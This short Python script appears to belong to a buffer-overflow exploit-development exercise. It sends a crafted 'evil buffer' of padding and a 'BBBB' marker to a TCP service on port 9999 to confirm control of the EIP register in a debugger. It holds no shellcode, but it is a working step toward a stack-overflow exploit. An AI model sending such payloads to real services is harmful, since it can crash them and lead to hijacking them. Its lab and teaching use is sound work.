#!/usr/bin/env python3
#Simple program to confirm control of EIP

# Bytes sent are As for offset, Bs for EIP, and C for overflow
# If it took 10 bytes to overflow, payload would look like this
# AAAAAAAAAABBBBCCCCCCCCCC
# -Offset---EIP--Overflow
# The EIP is only 4 bytes, so we send just that section as Bs
# When looking back in Immunity Debugger, we should see 42424242
# This confirms control of EIP

import socket

ip, port = "192.0.0.0", 9999
command = b""
length = 20 # amount of bytes that crashed the program from 00_crash.py
offset = b"A" * 10 # the EIP offset we get from 01_EnumEIP.py
new_eip = b"BBBB"
fill = b"C" * (length - len(new_eip) - len(offset))
timeout = 5


payload = b"".join([
    command, offset, new_eip, fill
])

try:
    with socket.socket() as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        print(f"Sending evil buffer with {len(payload) - len(command)} bytes")
        s.send(payload + b"\r\n")
        print("Done!")
except:
    print("Could not connect.")